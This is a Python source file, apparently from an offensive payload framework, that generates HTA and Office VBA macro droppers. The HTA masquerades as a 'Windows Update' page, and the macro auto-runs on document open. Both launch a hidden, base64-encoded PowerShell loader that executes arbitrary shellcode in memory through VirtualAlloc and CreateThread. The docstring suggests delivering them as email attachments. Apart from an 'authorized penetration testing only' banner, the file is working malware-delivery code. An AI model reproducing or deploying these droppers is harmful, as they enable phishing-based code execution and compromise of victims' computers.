"""HTA and VBA Format Builders.

HTA: Microsoft HTML Application — executed by mshta.exe.
     Embeds a VBScript dropper that runs a PowerShell loader.
     Delivery: send as email attachment, host on web server, etc.

VBA: Office macro source for Word/Excel.
     Auto-opens and runs the shellcode loader.
     Delivery: embed in .docm/.xlsm or paste into Macro editor.

FOR AUTHORIZED PENETRATION TESTING ONLY.
"""
from __future__ import annotations

import base64
import secrets
import textwrap


class HtaFormat:
    """HTA and VBA dropper builder."""

    def __init__(self, fmt: str = "hta"):
        if fmt not in ("hta", "vba"):
            raise ValueError(f"HtaFormat supports 'hta' or 'vba', got {fmt!r}")
        self.fmt = fmt

    def build(self, shellcode: bytes, lhost: str = "", lport: int = 0) -> bytes:
        """Build HTA or VBA dropper bytes."""
        if self.fmt == "hta":
            return self._build_hta(shellcode, lhost, lport).encode()
        return self._build_vba(shellcode, lhost, lport).encode()

    # ── HTA ───────────────────────────────────────────────────────────

    def _build_hta(self, sc: bytes, lhost: str, lport: int) -> str:
        """HTA file with embedded VBScript that executes PowerShell loader."""
        ps1_cmd = self._ps1_one_liner(sc)
        rand_id  = secrets.token_hex(4)

        return textwrap.dedent(f"""\
        <!DOCTYPE html>
        <!-- Forge Payload — HTA Dropper | FOR AUTHORIZED PENETRATION TESTING ONLY -->
        <html>
        <head>
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>Windows Update</title>
        <HTA:APPLICATION
            ID="{rand_id}"
            APPLICATIONNAME="WindowsUpdate"
            BORDERSTYLE="none"
            CAPTION="no"
            SHOWINTASKBAR="no"
            SINGLEINSTANCE="yes"
            WINDOWSTATE="minimize"
        />
        <script language="VBScript">
        ' Forge HTA Dropper
        ' FOR AUTHORIZED PENETRATION TESTING ONLY.
        Dim objShell, objWMI, strCmd
        strCmd = "{ps1_cmd}"

        Sub Window_OnLoad
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run strCmd, 0, False
            Wait 2000
            Self.Close()
        End Sub

        Sub Wait(n)
            Dim t : t = Timer
            Do While Timer - t < n / 1000
                DoEvents
            Loop
        End Sub
        </script>
        </head>
        <body>
        <p>Checking for updates...</p>
        </body>
        </html>
        """)

    # ── VBA ───────────────────────────────────────────────────────────

    def _build_vba(self, sc: bytes, lhost: str, lport: int) -> str:
        """VBA macro for Office documents (Word/Excel)."""
        ps1_cmd  = self._ps1_one_liner(sc)
        # Split long cmd into chunks to avoid VBA line-length limits (1024 chars)
        chunks   = [ps1_cmd[i:i+200] for i in range(0, len(ps1_cmd), 200)]
        cmd_join = " & _\n        ".join(f'"{c}"' for c in chunks)

        return textwrap.dedent(f"""\
        ' ============================================================
        ' Forge Payload — VBA Macro Dropper
        ' FOR AUTHORIZED PENETRATION TESTING ONLY.
        '
        ' Usage:
        '   1. Open Word/Excel → Alt+F11 → Insert → Module
        '   2. Paste this code
        '   3. Save as .docm/.xlsm
        '   4. Run Document_Open / Workbook_Open on open
        ' ============================================================
        Option Explicit

        Private Sub Document_Open()
            RunPayload
        End Sub

        Private Sub AutoOpen()
            RunPayload
        End Sub

        Private Sub Workbook_Open()
            RunPayload
        End Sub

        Private Sub RunPayload()
            Dim strCmd As String
            strCmd = {cmd_join}

            Dim oShell As Object
            Set oShell = CreateObject("WScript.Shell")
            oShell.Run strCmd, 0, False
            Set oShell = Nothing
        End Sub
        """)

    # ── Shared ────────────────────────────────────────────────────────

    def _ps1_one_liner(self, sc: bytes) -> str:
        """Build a PowerShell -EncodedCommand one-liner that runs the shellcode."""
        if self._is_c_source(sc):
            # C source: prompt operator to compile first
            return 'powershell.exe -NonInteractive -Command "Write-Host compile-first"'

        b64_sc = base64.b64encode(sc).decode()
        vn     = secrets.token_hex(3)

        ps1 = textwrap.dedent(f"""\
        $sc = [Convert]::FromBase64String('{b64_sc}')
        $k = Add-Type -MemberDefinition @'
          [DllImport("kernel32")]
          public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr b,uint c,uint d);
          [DllImport("kernel32")]
          public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,out uint d);
          [DllImport("kernel32")]
          public static extern IntPtr CreateThread(IntPtr a,UIntPtr b,IntPtr c,IntPtr d,uint e,IntPtr f);
          [DllImport("kernel32")]
          public static extern uint WaitForSingleObject(IntPtr h,uint ms);
        '@ -Name 'K{vn}' -Namespace 'F' -PassThru
        $m = $k::VirtualAlloc(0,[UIntPtr]$sc.Length,0x3000,0x04)
        [System.Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length)
        $o=0; $k::VirtualProtect($m,[UIntPtr]$sc.Length,0x20,[ref]$o)|Out-Null
        $t=$k::CreateThread(0,0,$m,0,0,0)
        $k::WaitForSingleObject($t,0xFFFFFFFF)|Out-Null
        """).replace("\n", " ; ")

        ps1_b64 = base64.b64encode(ps1.encode("utf-16-le")).decode()
        return (f'powershell.exe -NonInteractive -WindowStyle Hidden '
                f'-EncodedCommand {ps1_b64}')

    def _is_c_source(self, data: bytes) -> bool:
        try:
            head = data[:64].decode("utf-8", errors="strict").lstrip()
            return head.startswith("/*") or head.startswith("#")
        except UnicodeDecodeError:
            return False
